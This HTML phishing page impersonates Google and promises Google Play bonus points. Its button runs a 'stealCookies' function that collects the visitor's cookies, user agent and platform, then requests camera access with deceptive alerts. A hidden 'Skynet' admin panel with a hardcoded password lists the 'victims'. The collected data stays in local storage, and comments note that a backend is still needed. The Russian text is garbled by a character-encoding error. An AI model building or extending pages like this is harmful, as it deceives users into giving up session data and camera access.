<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>—Ç–µ—Å—Ç</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
        }
        body {
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
            color: white;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            text-align: center;
        }
        .logo {
            font-size: 32px;
            margin: 20px 0;
            text-shadow: 0 0 10px rgba(255,255,255,0.5);
        }
        .card {
            background: rgba(0, 0, 0, 0.7);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 0 30px rgba(0,0,0,0.5);
            margin-bottom: 20px;
            backdrop-filter: blur(10px);
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        .btn {
            background: #4285F4;
            color: white;
            border: none;
            border-radius: 50px;
            padding: 15px 40px;
            font-size: 18px;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s;
            width: 100%;
        }
        .btn:hover {
            background: #3367D6;
            transform: scale(1.05);
        }
        .admin-btn {
            position: absolute;
            top: 15px;
            right: 15px;
            width: 30px;
            height: 30px;
            background: #555;
            border-radius: 5px;
            cursor: pointer;
        }
        .admin-panel {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 1000;
            padding: 20px;
            overflow-y: auto;
        }
        .user-card {
            background: #222;
            border-radius: 10px;
            padding: 15px;
            margin: 10px 0;
            text-align: left;
        }
        .video-feed {
            width: 100%;
            background: #000;
            margin: 10px 0;
            border-radius: 10px;
        }
        #camera-feed {
            width: 100%;
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <!-- –û—Å–Ω–æ–≤–Ω–æ–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è –∂–µ—Ä—Ç–≤—ã -->
    <div class="container">
        <div class="logo">Google</div>
        <div class="card">
            <h1>–°–ø–µ—Ü–∏–∞–ª—å–Ω–æ–µ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π!</h1>
            <p>–ü–æ–ª—É—á–∏—Ç–µ 5000 –±–æ–Ω—É—Å–Ω—ã—Ö –±–∞–ª–ª–æ–≤ Google Play –∑–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–∞</p>
            
            <button class="btn" onclick="stealCookies()">–ü–û–õ–£–ß–ò–¢–¨ –ë–û–ù–£–°–´</button>
        </div>
    </div>

    <!-- –ö–Ω–æ–ø–∫–∞ –∞–¥–º–∏–Ω–∫–∏ -->
    <div class="admin-btn" onclick="toggleAdminPanel()"></div>

    <!-- –°–∫—Ä—ã—Ç–∞—è –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å -->
    <div class="admin-panel" id="adminPanel">
        <div class="container">
            <h1>üî• –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å Skynet</h1>
            <input type="password" id="adminPass" placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å" style="padding:10px;width:100%;margin:10px 0;">
            <button class="btn" onclick="loginAdmin()">–í–û–ô–¢–ò</button>
            
            <div id="usersList" style="display:none;">
                <h2>–ó–∞—Ä–∞–∂–µ–Ω–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:</h2>
                <!-- –°—é–¥–∞ –ø–æ–¥–≥—Ä—É–∂–∞—é—Ç—Å—è –∂–µ—Ä—Ç–≤—ã -->
            </div>
        </div>
    </div>

    <script>
        // –•—Ä–∞–Ω–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö
        let victims = JSON.parse(localStorage.getItem('skynet_victims')) || [];
        const ADMIN_PASS = "578574";

        // 1. –ö—Ä–∞–∂–∞ –∫—É–∫–æ–≤ –ø—Ä–∏ –Ω–∞–∂–∞—Ç–∏–∏ –∫–Ω–æ–ø–∫–∏
        function stealCookies() {
            // –§–∏–∫—Ç–∏–≤–Ω—ã–π —Å–±–æ—Ä –∫—É–∫–æ–≤
            const cookies = document.cookie;
            const ip = "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ (—Ç—Ä–µ–±—É–µ—Ç—Å—è –±–µ–∫–µ–Ω–¥)";
            
            // –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
            const deviceData = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                cookies: cookies,
                ip: ip,
                history: "–¢—Ä–µ–±—É–µ—Ç –±—ç–∫–µ–Ω–¥ –¥–ª—è —Å–±–æ—Ä–∞",
                timestamp: new Date().toISOString()
            };
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ "–±–∞–∑—É"
            victims.push(deviceData);
            localStorage.setItem('skynet_victims', JSON.stringify(victims));
            
            // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ
            requestCamera();
        }

        // 2. –î–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ
        function requestCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    // –§–∏–∫—Å–∞—Ü–∏—è –¥–æ—Å—Ç—É–ø–∞
                    victims[victims.length - 1].cameraAccess = true;
                    
                    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
                    alert("–ö–∞–º–µ—Ä–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞! –ë–æ–Ω—É—Å—ã –∑–∞—á–∏—Å–ª–µ–Ω—ã.");
                })
                .catch(err => {
                    console.error("–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ:", err);
                    alert("–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –±–æ–Ω—É—Å–æ–≤ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Ä–∞–∑—Ä–µ—à–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ!");
                });
        }

        // 3. –ê–¥–º–∏–Ω–∫–∞
        function toggleAdminPanel() {
            document.getElementById('adminPanel').style.display = 'block';
        }

        function loginAdmin() {
            const pass = document.getElementById('adminPass').value;
            if(pass === ADMIN_PASS) {
                document.getElementById('usersList').style.display = 'block';
                renderVictims();
            } else {
                alert("–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å, —Å—É–∫–∞!");
            }
        }

        function renderVictims() {
            const container = document.getElementById('usersList');
            container.innerHTML = '<h2>–ó–∞—Ä–∞–∂–µ–Ω–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:</h2>';
            
            victims.forEach((victim, index) => {
                const card = document.createElement('div');
                card.className = 'user-card';
                
                card.innerHTML = `
                    <h3>–ñ–µ—Ä—Ç–≤–∞ #${index+1}</h3>
                    <p><strong>–í—Ä–µ–º—è:</strong> ${victim.timestamp}</p>
                    <p><strong>–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:</strong> ${victim.userAgent}</p>
                    <p><strong>–ö—É–∫–∏:</strong> ${victim.cookies.substring(0, 50)}...</p>
                    <p><strong>–ò—Å—Ç–æ—Ä–∏—è:</strong> ${victim.history}</p>
                    <div class="video-feed">
                        <p>–ö–∞–º–µ—Ä–∞: ${victim.cameraAccess ? '‚úÖ –ê–ö–¢–ò–í–ù–ê' : '‚ùå –û–®–ò–ë–ö–ê'}</p>
                        <!-- –î–ª—è —Ä–µ–∞–ª—å–Ω–æ–π —Ç—Ä–∞–Ω—Å–ª—è—Ü–∏–∏ –Ω—É–∂–µ–Ω –±—ç–∫–µ–Ω–¥ -->
                    </div>
                `;
                
                container.appendChild(card);
            });
        }

        // –ê–≤—Ç–æ—Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –∫–∞–∂–¥—ã–µ 10 —Å–µ–∫
        setInterval(() => {
            localStorage.setItem('skynet_victims', JSON.stringify(victims));
        }, 10000);
    </script>
</body>
</html>
